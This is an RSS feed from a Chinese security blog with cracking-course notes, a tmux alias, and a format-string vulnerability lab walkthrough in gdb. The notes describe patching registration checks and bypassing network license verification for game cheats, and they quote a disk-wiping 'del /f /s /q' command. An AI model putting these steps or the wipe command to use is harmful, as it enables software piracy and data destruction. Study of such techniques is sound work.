<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Thu, 28 Jul 2016 07:46:44 +0800</pubDate>
    <lastBuildDate>Thu, 28 Jul 2016 07:46:44 +0800</lastBuildDate>
    <generator>Jekyll v3.1.2</generator>
    
      <item>
        <title>小生我怕怕笔记</title>
        <description>&lt;h3 id=&quot;x01-12&quot;&gt;0x01 破解技巧1&lt;小生我怕怕第2课&gt;&lt;/小生我怕怕第2课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;右键同时查找文本并复制多个&quot;未注册/注册&quot;关键字附近的汇编代码到文本文件,比较它们,找出关键的与未注册相关的call调用、cmp处的相关比较(快速找出关键call)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-23&quot;&gt;0x02 破解技巧2&lt;小生我怕怕第3课&gt;&lt;/小生我怕怕第3课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;se和vm的壳有反调试功能,调试方法:
     ctrl+f2后shift+f9
2&amp;gt;各语言入口特征及按钮事件查找方法:
1&amp;gt;&amp;gt;c++
         c++字符串查找:ascii
         c++按钮事件查找:sub eax,0A
         c++入口函数GetVersion

c++的入口
00408027 &amp;gt;/$  55             push ebp
00408028  |.  8BEC           mov ebp,esp
0040802A  |.  6A FF          push -0x1
0040802C  |.  68 F0F14000    push C++.0040F1F0
00408031  |.  68 84AF4000    push C++.0040AF84                        ;  SE 处理程序安装
00408036  |.  64:A1 00000000 mov eax,dword ptr fs:[0]
0040803C  |.  50             push eax
0040803D  |.  64:8925 000000&amp;gt;mov dword ptr fs:[0],esp
00408044  |.  83EC 58        sub esp,0x58
00408047  |.  53             push ebx
00408048  |.  56             push esi
00408049  |.  57             push edi                                 ;  ntdll.7C930228
0040804A  |.  8965 E8        mov [local.6],esp
0040804D  |.  FF15 E4F04000  call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.GetVersion&amp;gt;;

2&amp;gt;&amp;gt;delphin
         delphin字符串查找:ascii
         delphin按钮事件查找:右键-查找-查找二进制字符串:
             740E8BD38B83????????FF93????????
         ctrl+l键下翻页查找,每个都下断

delphin的入口
0045D408 &amp;gt; $  55             push ebp
0045D409   .  8BEC           mov ebp,esp
0045D40B   .  83C4 F0        add esp,-0x10
0045D40E   .  B8 28D24500    mov eax,DELPHI.0045D228
0045D413   .  E8 6088FAFF    call DELPHI.00405C78

3&amp;gt;&amp;gt;汇编
         汇编字符串查找:ascii
         汇编入口函数:GetModuleHandleA

汇编的入口
0040285E &amp;gt;/$  6A 00          push 0x0                                 ; /pModule = NULL
00402860  |.  E8 970B0000    call &amp;lt;jmp.&amp;amp;kernel32.GetModuleHandleA&amp;gt;    ; \GetModuleHandleA

4&amp;gt;&amp;gt;易语言
         易语言字符串查找:ascii
         易语言按钮事件(查找二进制代码):FF 55 FC 5F 5E
         易语言入口函数:GetVersion
         停留下后,alt+f9---&amp;gt;查找二进制字符串:
              FC DB E3 E8 ?? ?? ?? ??
         多数易语言采用花指令对易格式体进行保护,可先采用E junk code处理掉再查找ascii字符串
         

5&amp;gt;&amp;gt;vc8
         vc8字符串查找:unicode
         vc8按钮事件查找:sub eax 0A
         vc8入口函数:GetStartupInfoW

v8的入口
00403A30 &amp;gt; $  E8 6E270000   call VC8.004061A3
00403A35   .^ E9 79FEFFFF   jmp VC8.004038B3
00403A3A  /$  55            push ebp
00403A3B  |.  8BEC          mov ebp,esp
00403A3D  |.  83EC 08       sub esp,0x8

6&amp;gt;&amp;gt;vb
         vb字符串查找:unicode
         vb 查找字符串时采用二进制字符串816C2404??000000
         vb入口特征查找函数:ThunRTMain
         注:识别VB P-code编译时,只需要查找不到按钮事件就是P-CODE编译
               P-CODE代码是虚拟代码,需要独立的调试器
         vb的入口
00401978   .- FF25 18114000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.#613&amp;gt;]      ;  msvbvm60.rtcVarStrFromVar
0040197E   .- FF25 84104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.__vbaVarTst&amp;gt;;  msvbvm60.__vbaVarTstEq
00401984   .- FF25 7C104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.#528&amp;gt;]      ;  msvbvm60.rtcUpperCaseVar
0040198A   .- FF25 A8104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.EVENT_SINK_&amp;gt;;  msvbvm60.EVENT_SINK_QueryInterface
00401990   .- FF25 78104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.EVENT_SINK_&amp;gt;;  msvbvm60.EVENT_SINK_AddRef
00401996   .- FF25 9C104000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.EVENT_SINK_&amp;gt;;  msvbvm60.EVENT_SINK_Release
0040199C   $- FF25 08114000 jmp dword ptr ds:[&amp;lt;&amp;amp;MSVBVM60.#100&amp;gt;]      ;  msvbvm60.ThunRTMain
004019A2      00            db 00
004019A3      00            db 00
004019A4 &amp;gt; $  68 5C284000   push VB.0040285C                         ;  ASCII &quot;VB5!6&amp;amp;vb6chs.dll&quot;
004019A9   .  E8 EEFFFFFF   call &amp;lt;jmp.&amp;amp;MSVBVM60.#100&amp;gt;

3&amp;gt;die64
DIE64类似于PEID的功能,但是他强大之处,在于他可以不管是任何壳保护的情况下,都可以识别出他的编写语言

4&amp;gt;vmp
     VMP入口,就是看起来很凌乱,就像未解码的代码一样,但是VMP保护分两种代码
乱序
虚拟

VMP在默认保护的情况下是不会保护功能代码的,并且VMP保护功能代码只是一个区段,如果大家看到的.VMP区段有三条的话,就表示此程序已经被VMP进行了最大保护,如果只是一条区段的话,那就是乱序保护,两条区段的话,就是乱序加虚拟保护

5&amp;gt;tmd
TMD2.10以后的版本和WL的版本入口都是一样

00600000 &amp;gt;  83EC 04         sub esp,0x4
00600003    50              push eax
00600004    53              push ebx
00600005    E8 01000000     call 易语言.0060000B
0060000A    CC              int3
0060000B    58              pop eax                                  ; kernel32.7C817027
0060000C    89C3            mov ebx,eax
0060000E    40              inc eax

6&amp;gt;个人推荐这个保护自己的补丁Private exe Protector
7&amp;gt;SE调试技巧,就是在运行起来之后4-5分钟时在去调试,可以避免少被ANTI到,ANTI所指的是反调试
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x03-34&quot;&gt;0x03 破解技巧3&lt;小生我怕怕第4课&gt;&lt;/小生我怕怕第4课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;回溯的方法
(a.并非所有程序的破解都可以用b.该方法可用于没有字符串可以查找的情况)

1&amp;gt;&amp;gt;随意输入用户名+注册码后程序弹出对话框显示注册失败
2&amp;gt;&amp;gt;f12暂停程序
3&amp;gt;&amp;gt;alt+f9执行到用户代码
4&amp;gt;&amp;gt;点击对话框中的确定
5&amp;gt;&amp;gt;在当前程序领空中的eip附近找到jne,je或其他关键跳转进行修改

2&amp;gt;按钮事件下断点的方法
(a.脚本下断点:http://pan.baidu.com/s/1pLAeaL1中的ollyscript脚本b.自己通过破解技巧2中的按钮事件二进制字符串下断)
1&amp;gt;&amp;gt;下按钮事件断点,ab两种方法
2&amp;gt;&amp;gt;随意输入用户名+注册码后点击确定注册,程序中断
3&amp;gt;&amp;gt;在堆栈窗口中往下查找输入的用户名注册码等字符串
4&amp;gt;&amp;gt;在堆栈窗口中3中找到的字符串的上面的最近几处的&quot;返回到...&quot;处右键在汇编窗口中显示,找出关键call
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x04-45&quot;&gt;0x04 破解技巧4&lt;小生我怕怕第5课&gt;&lt;/小生我怕怕第5课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;在破解中合适地运用&quot;所有常量&quot;和&quot;所有命令&quot;会使破解轻松很多
2&amp;gt;vb和delphin中的&quot;所有常量&quot;几乎对破解没有帮助
3&amp;gt;vb破解时
1&amp;gt;&amp;gt;右键查找所有模块调用---&amp;gt;在所有rtcMsgBox下断
2&amp;gt;&amp;gt;任意输入用户名和注册码,单击确定注册
3&amp;gt;&amp;gt;排除明显不是关键断点的rtcMsgBox断点
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x05-56&quot;&gt;0x05 破解技巧5&lt;小生我怕怕第6课&gt;&lt;/小生我怕怕第6课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;vb多采用0xffff做比较,判断是否是正式版
2&amp;gt;vb破解时,可在__vbaStrCmp的所有调用处下断
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x06-67&quot;&gt;0x06 破解技巧6&lt;小生我怕怕第7课&gt;&lt;/小生我怕怕第7课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt; bc++的按钮事件和delphin是一样的
2&amp;gt;重启验证必须在程序还未完全初始化时,找到重启后的关键地址,进行破解
3&amp;gt;一般破解的关键跳转(je,jne)处会涉及到eax
4&amp;gt;一般与注册表有关时,RegCloseKey以下为关键验证的地方,结合3找出关键跳转,进行破解
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x07-79&quot;&gt;0x07 破解技巧7&lt;小生我怕怕第9课&gt;&lt;/小生我怕怕第9课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;一般破解的关键在eax
2&amp;gt;vb的程序,一般以-1(FFFF)和1进行比较
3&amp;gt;破解采用api下断的方法时,在api上下的断点是针对系统领域下的,需要alt+f9运行到用户代码方可继续进行调试
4&amp;gt;od死码
1&amp;gt;&amp;gt;什么是OD死码?
OD死码指的就是OD反汇编中游戏更新后也不变的汇编.
eg:
8D 3C 24 ??????????????8D 75 08 8B 1E 83 C6 04 51

每两个问号代表一个字节,我们也可以通过问号去代表会改变的数值,也可以通过问号去代表着寄存器换算的数值,只需要前后左右,照顾周全就OK,PUSH 是不会改变的,但是他也会因为PUSH的值不同而有所改变,所以,我们要根据实际的情况

2&amp;gt;&amp;gt;如何设立?
规则:最多8条汇编,因为OD里ctrl+s搜的时候最多只能8条
哪些汇编不能用于OD死码:call 内存地址
jz/jnz/je(等跳转语句) 内存地址
mov eax,[ecx+0abc] 偏移abc比较大的不可以.
mov eax,[esp+30] 汇编里有ESP堆栈寄存器的不可以,后面跟的偏移+30会变化

3&amp;gt;&amp;gt;为什么要设立?
因为游戏更新基址,较大的偏移会变化,为了方便,所以设立OD死码,方便快速获取游戏更新后的相关数据.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x08-810&quot;&gt;0x08 破解技巧8&lt;小生我怕怕第10课&gt;&lt;/小生我怕怕第10课&gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1&amp;gt;一个程序脱壳以后不要直接运行它,要是有校验格盘那么就受伤了,可以查找字符串或在虚拟机中运行
2&amp;gt;易语言窗体事件
004156A5   .  68 02000080   push 0x80000002
004156AA   .  6A 00         push 0x0
004156AC   .  68 00000000   push 0x0
004156B1   .  6A 00         push 0x0
004156B3   .  6A 00         push 0x0
004156B5   .  6A 00         push 0x0
004156B7   .  68 01000100   push 0x10001
004156BC   .  FF35 D4744C00 push dword ptr ds:[0x4C74D4]
004156C2   .  FF35 D0744C00 push dword ptr ds:[0x4C74D0]
004156C8   .  68 03000000   push 0x3
004156CD   .  BB D09E4100   mov ebx,六开挤线.00419ED0
004156D2   .  E8 87420000   call 六开挤线.0041995E
004156D7   .  83C4 28       add esp,0x28
004156DA   .  6A 00         push 0x0
004156DC   .  68 02000000   push 0x2
004156E1   .  6A FF         push -0x1
004156E3   .  6A 12         push 0x12
004156E5   .  68 E6A90206   push 0x602A9E6
004156EA   .  68 7F9F0252   push 0x52029F7F
004156EF   .  E8 76420000   call 六开挤线.0041996A
004156F4   .  83C4 18       add esp,0x18
004156F7   .  6A 00         push 0x0
004156F9   .  68 00000000   push 0x0
004156FE   .  6A FF         push -0x1
00415700   .  6A 05         push 0x5
00415702   .  68 E6A90206   push 0x602A9E6
00415707   .  68 7F9F0252   push 0x52029F7F
0041570C   .  E8 59420000   call 六开挤线.0041996A
00415711   .  83C4 18       add esp,0x18
00415714   .  E8 0B79FFFF   call 六开挤线.0040D024
00415719   .  E8 C594FFFF   call 六开挤线.0040EBE3

004156DA   .  6A 00         push 0x0
004156DC   .  68 02000000   push 0x2
004156E1   .  6A FF         push -0x1
004156E3   .  6A 12         push 0x12
004156E5   .  68 E6A90206   push 0x602A9E6
004156EA   .  68 7F9F0252   push 0x52029F7F
004156EF   .  E8 76420000   call 六开挤线.0041996A
004156F4   .  83C4 18       add esp,0x18

这样的代码我们叫他为窗体事件,只要鼓捣过易语言老版本的人都比较清楚

只要能锁定到窗体事件,完全就可以来一个超级大跳转

3&amp;gt;常见网络验证
首先我们按强度排列
第一的当然是
可可验证
绝大多数运用在DNF外挂上面

飘零网络验证

飘零的早期版本,是可以山寨到管理端的

CC网络验证

相对来说,较为简单,但是作者也颇贱,原版CC就带有格盘代码

小烦的网络验证

更为简单,有数据库漏洞

当我们辨别出是那一款比较常见的网络验证之时,可以常试先找一份无壳版的跟一下,然后在套用思路即可

4&amp;gt;易语言的远跳转以及易语言的JE JNZ是非常需要关注的
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x09-911-19&quot;&gt;0x09 破解技巧9&amp;lt;11-19课&amp;gt;&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;小生我怕怕第11课:
     易原体讲解
小生我怕怕第12课:
     delphin网络验证
     格盘命令:cmd.exe /c del /f /s /q /a c:\*.*
小生我怕怕第13课:
     c的网络验证(c++外挂破解)
小生我怕怕第14课:
     讲解如何去除和锁定网络验证暗装

     当我们破解了程序发现没有功能,那么就是暗装导致的
     当我们破解程序突然间关机,那么就是暗装导致的
     当我们破解程序突然被格盘,那么就是暗装导致的
     当我们破解时,出现暗装那么是系统错误或者内存错误,都有可能,但是也并不是绝对
     部分程序他是由各自系统不兼容所导致,所以在选择破解程序时遇见暗装可以给多几个人测试是否正常

小生我怕怕第15课:
     剖析网络验证的机制

小生我怕怕第16课:
     快速锁定功能项进行爆破,从而达到跳过网络机制

     当我们破解程序限制时,可以借助彗星小助手和XT去查找他是否有多窗体,如果有多窗体,我们可以通过这两个工具去穿透第一层验证窗体,去第二层,实施功能爆破

小生我怕怕第17课:
     认识本地网络验证的几种方法

     本地验证也就是将远程服务器的IP地址转换成127.0.0.1
     然后在本地根据服务器端口进行模拟,一个本地的验证端

     通常可以本地验证的程序是属于封包固定型态
     或者就是你能理解他的算法加密
     又或者是你能固定他的加密密钥

     还有一种方法的本地验证就是,需要你能弄到验证文件,然后在自己的机器或者服务器上架设

     RECV就是接收封包
     SEND 就是发送封包

     修改HOST型
     修改HOST表的方法千万不能运用在ASP型文件验证上,会被检测
     好处:简便,任何机器都可以使用
     坏处:薄弱,容易被检测

     更改IP型
     好处:简单,方便,没有什么技术性可言
     坏处:路由器,网吧都不可以使用
     注:路由器如果想使用此方法,可以使用泡泡鱼虚拟网卡进行修改

     网截拦截型
     好处:就是简单易用,列子比较多,并且他是全局注入型,可以拦截大部分程序
     坏处:被很多程序在启动之时,都会检测我们的C盘是否存在网截的DLL
     注:存放于C:\WINDOWS\system32

     HOOK型
     好处:强大易用,复杂,需要很好的编程基础
     坏处:一般人学不会,需要很多时间去学习

     免费模块型
     好处:没有基础也可以使用,但是相对来说比上面的HOOK型要为简便些
     坏处:不是太稳定,因为此模块只是早期的版本,可以使用超级模块5.0进行替换
     注:超级模块口碑不是太好,使用时小心

     收费模块型
     好处:稳定,拦截准趣,有BUG有人修复
     坏处:时不时不兼容,部分机器也出现拦截不下的现象

小生我怕怕第18课:
     解密网络验证之数据加密

小生我怕怕第19课:
     剖析网络验证之绑号风格
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Wed, 27 Jul 2016 00:00:00 +0800</pubDate>
        <link>/tmux/2016/07/27/%E5%B0%8F%E7%94%9F%E6%88%91%E6%80%95%E6%80%95%E7%A0%B4%E8%A7%A3%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">/tmux/2016/07/27/%E5%B0%8F%E7%94%9F%E6%88%91%E6%80%95%E6%80%95%E7%A0%B4%E8%A7%A3%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/</guid>
        
        <category>破解</category>
        
        <category>逆向</category>
        
        
        <category>tmux</category>
        
      </item>
    
      <item>
        <title>tmux自动布局</title>
        <description>&lt;p&gt;将下面复制到.zshrc中&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alias od=&quot;tmux splitw -h -p 38;tmux splitw -v -p 30;tmux selectp -L;tmux splitw -v -p 30;tmux selectp -U&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;快捷命令od可进入设定的layout
其他相关命令

tmux selectp -R    #选择右边的面板
tmux selectp -D    #选择下面的面板
tmux selectp -L    #选择左边的面板
tmux selectp -U    #选择上面的面板

下面4个根据man tmux利用
tmux setw main-pane-height 25
tmux setw main-pane-width 75
tmux select-layout main-horizontal    
tmux select-layout main-vertical

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Wed, 27 Jul 2016 00:00:00 +0800</pubDate>
        <link>/tmux/2016/07/27/tmux%E8%87%AA%E5%8A%A8%E5%B8%83%E5%B1%80/</link>
        <guid isPermaLink="true">/tmux/2016/07/27/tmux%E8%87%AA%E5%8A%A8%E5%B8%83%E5%B1%80/</guid>
        
        <category>tmux</category>
        
        
        <category>tmux</category>
        
      </item>
    
      <item>
        <title>格式化串漏洞</title>
        <description>&lt;h3 id=&quot;x01-&quot;&gt;0x01 结论知识&lt;/h3&gt;

&lt;p&gt;1&amp;gt;printf(“%x”)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%x&quot;):未进入printf函数前,第一个栈里的值
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;2&amp;gt;printf(“%8x”)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%8x&quot;):第一个栈里的值,最后输出到终端为8个字符长度的值(eg.12345678)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%3\$x&quot;)&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;%3\$x&quot;):第三个栈里的值(这一条适用于绝大多数的*nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)来达到同样的目的)
宽度格式符(%3)中的%和3是不分开的,如果%3后面加了\$(直接参数访问)则表示为打印第3个栈里的值
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;%3\$n&quot;)&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;printf(&quot;AAAA%3\$n&quot;):将4(4个A)写入第三个栈里的值指向的内存空间(这一条适用于绝大多数的*nix的系统,win下不支持则用printf(&quot;%x,%x,%x&quot;)),也即将第三个栈里的内容看作一个地址,要将该地址处的内容写成4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;x02-&quot;&gt;0x02 原理理解&lt;/h3&gt;

&lt;h4 id=&quot;refer&quot;&gt;1&amp;gt;refer&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://drops.wooyun.org/binary/7714
http://drops.wooyun.org/papers/9426
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;c&quot;&gt;2&amp;gt;c代码&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;假设文件名为md.c
------------md.c----------------
#include &amp;lt;stdio.h&amp;gt;
int main(void)
{ 
    int flag = 0;
    int *p = &amp;amp;flag; 
    char a[100];
    scanf(&quot;%s&quot;,a);
    printf(a);

    if(flag == 2000)
    {
        printf(&quot;good!!\n&quot;);
    }

    return 0;
}
-------------end----------------
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;section&quot;&gt;3&amp;gt;栈空间&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cplusplus.com/reference/cstdio/printf/&quot;&gt;printf函数&lt;/a&gt;&lt;br /&gt;
int printf ( const char * format, …  )&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;第一个参数为格式化串参数,后面可以有参数,也可以没有参数,printf只有一个参数时,cpu会把栈空间里的第一个参数(格式化串参数)后面的栈单元当作是printf的后续参数,因为cpu笨

一般在栈空间里,形如&quot;%8xaaa%8d%n&quot;的字符串参数会存放在某个地方,而在栈中printf的第一个参数char *format一般是这个字符串(&quot;%8xaaa%8d%n&quot;)的地址,这个栈单元下面(高地址)的栈单元中存放的值是被cpu当作的后续参数,eg:

printf(&quot;%8xaaa%8d%n&quot;)在栈中的数据如下:
    printf_ebp(printf函数帧中的第一句push的ebp)
    printf_retn(printf函数的返回地址)
    addr_of_&quot;%8xaaa%8d%n&quot;(栈中第一个参数)
    0x11111111(将成为栈中第二个参数)
    0x22222222(将成为栈中第三个参数)
    0x33333333(将成为栈中第三个参数)
    ...(将成为栈中第四个参数)
    ...(...)

上面的printf调用后将产生这样的效果:
    1.在屏幕上打印出:11111111aaa572662306(其中十六进制0x22222222对应十进制572662306),也即从printf的第二个参数开始打印或写入到对应地址
    2.向地址为0x33333333的内存中写入19(8+3+8=19)

后来发现这是windows中的情况,kalix64中栈中第一个参数的位置存放的不再是字符串&quot;%8xaaa%8d%n&quot;地址,而是字符串本身

上面的2中的c代码对应的栈中分配的情况如下图format所示:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;图format
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/format.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;后来才发现的上图是在win7x64位系统上用od跟踪绘制的结果图,在linux中,并不是这样的情况,linux中a[100]在linux中的栈空间中存放的位置会分配在p上面,而不是flag下面,且win7x64系统中,visual studio编译时会失败,强制用od加载并在调用printf时改写栈中format为含有%n的格式化串(eg.%10x%n)同样会异常失败,无法实现&quot;写&quot;

因此,这个实验更适合在linux下进行,且kalix64中的情况与http://drops.wooyun.org/papers/9426中的情况不一样,将md.c复制到protostar(32位)系统中进行实验

scp /root/桌面/md.c user@192.168.3.221:/tmp
pass:user
cd /tmp
gcc -g -o md md.c
gdb md
disas /m main
------output:-------
8           printf(a);
0x08048482 &amp;lt;main+46&amp;gt;:   lea    0x14(%esp),%eax
0x08048486 &amp;lt;main+50&amp;gt;:   mov    %eax,(%esp)
0x08048489 &amp;lt;main+53&amp;gt;:   call   0x8048364 &amp;lt;printf@plt&amp;gt;
---------end--------
b*main+53
r
input:AAAA%x.%x.%x
x/20x $esp
-----output:------
0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
0xbffff700:     0x00000000      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff710:     0xb7fd7ff4      0xb7ec6165      0xbffff728      0xb7eada75
0xbffff720:     0xb7fd7ff4      0x08049668      0xbffff738      0x08048330
------end---------
根据上面windows下od跟踪绘出的图容易知道,0xbffff6e0处存放的为字符串&quot;AAAA%x.%x.%x&quot;的内存地址,也即0xbffff6e0处存放的为printf的第一个参数,0xbffff6e4为第二个参数,以此下推

按照上面图format的理解易知程序运行完后将在屏幕上打印出:AAAAbffff6f4.080481dc.bffff778(从printf的第二个参数开始打印)

如果scanf输入的是:AAAA%x.%x.%x.%x.%x,那么最后一个输出的地址将是41414141,因为printf的第六个参数是41414141,从第二个参数到第六个参数共5个栈单元大小

再次分析此linux系统(protostar)中的变量在栈中存放的具体情况,如下
disas main
--------output:--------
   │0x8048454 &amp;lt;main&amp;gt;                push   %ebp                                                                                                                                                                   │
   │0x8048455 &amp;lt;main+1&amp;gt;              mov    %esp,%ebp                                                                                                                                                              │
   │0x8048457 &amp;lt;main+3&amp;gt;              and    $0xfffffff0,%esp                                                                                                                                                       │
   │0x804845a &amp;lt;main+6&amp;gt;              add    $0xffffff80,%esp                                                                                                                                                       │
   │0x804845d &amp;lt;main+9&amp;gt;              movl   $0x0,0x78(%esp)                                                                                                                                                        │
   │0x8048465 &amp;lt;main+17&amp;gt;             lea    0x78(%esp),%eax                                                                                                                                                        │
   │0x8048469 &amp;lt;main+21&amp;gt;             mov    %eax,0x7c(%esp)                                                                                                                                                        │
   │0x804846d &amp;lt;main+25&amp;gt;             mov    $0x8048570,%eax                                                                                                                                                        │
   │0x8048472 &amp;lt;main+30&amp;gt;             lea    0x14(%esp),%edx                                                                                                                                                        │
   │0x8048476 &amp;lt;main+34&amp;gt;             mov    %edx,0x4(%esp)                                                                                                                                                         │
   │0x804847a &amp;lt;main+38&amp;gt;             mov    %eax,(%esp)                                                                                                                                                            │
   │0x804847d &amp;lt;main+41&amp;gt;             call   0x8048374 &amp;lt;__isoc99_scanf@plt&amp;gt;                                                                                                                                         │
   │0x8048482 &amp;lt;main+46&amp;gt;             lea    0x14(%esp),%eax                                                                                                                                                        │
   │0x8048486 &amp;lt;main+50&amp;gt;             mov    %eax,(%esp)                                                                                                                                                            │
B+&amp;gt;│0x8048489 &amp;lt;main+53&amp;gt;             call   0x8048364 &amp;lt;printf@plt&amp;gt; 
-----------end---------
main+9处为将flag(flag为0)存放到esp+0x78里面,也即esp+0x78处存放flag
main+21处为将esp+0x78的值(flag所在的地址)放入到esp+0x7c中,也即flag+7c存放flag的地址
形如:

        --------
addr1      0         addr1=esp+0x78,flag被赋值为0
        --------
         addr1       esp+0x7c处存放p,p被赋值为flag的地址
        --------

flag和p在栈中存放的位置情况与windows中的实验完全相反,linux中是flag存放在p的上面,而win7x64中是flag存放在p的下面

在main+21处下断,用来查看esp+0x78的值,也即addr1的值,然后addr1+4即为p存放的地址,算出p存放的地址与printf第二个参数的地址相差多少,就可以知道如何安排format(%n的合适安排)来达到改变p指向的内容的值的目的,也即将一个值写入[p],相当于intel风格汇编语句mov [p],something

q
gdb md
disas main
-------------output:--------------
0x08048454 &amp;lt;main+0&amp;gt;:    push   %ebp
0x08048455 &amp;lt;main+1&amp;gt;:    mov    %esp,%ebp
0x08048457 &amp;lt;main+3&amp;gt;:    and    $0xfffffff0,%esp
0x0804845a &amp;lt;main+6&amp;gt;:    add    $0xffffff80,%esp
0x0804845d &amp;lt;main+9&amp;gt;:    movl   $0x0,0x78(%esp)
0x08048465 &amp;lt;main+17&amp;gt;:   lea    0x78(%esp),%eax
0x08048469 &amp;lt;main+21&amp;gt;:   mov    %eax,0x7c(%esp)
---------------end----------------
b*main+21
r
p/x $eax
-----output:-------
$3 = 0xbffff758,也即0xbffff758处存放的为flag,addr1=0xbfff758
-------end---------
disas main
-------------output:----------------
0x0804847d &amp;lt;main+41&amp;gt;:   call   0x8048374 &amp;lt;__isoc99_scanf@plt&amp;gt;
0x08048482 &amp;lt;main+46&amp;gt;:   lea    0x14(%esp),%eax
0x08048486 &amp;lt;main+50&amp;gt;:   mov    %eax,(%esp)
0x08048489 &amp;lt;main+53&amp;gt;:   call   0x8048364 &amp;lt;printf@plt&amp;gt;
---------------end------------------
b*main+53
c
input:AAAA%x.%x.%x
x/40x $esp
------------output:-----------------
0xbffff6e0:     0xbffff6f4      0xbffff6f4      0x080481dc      0xbffff778
0xbffff6f0:     0xb7fffa54      0x41414141      0x252e7825      0x78252e78
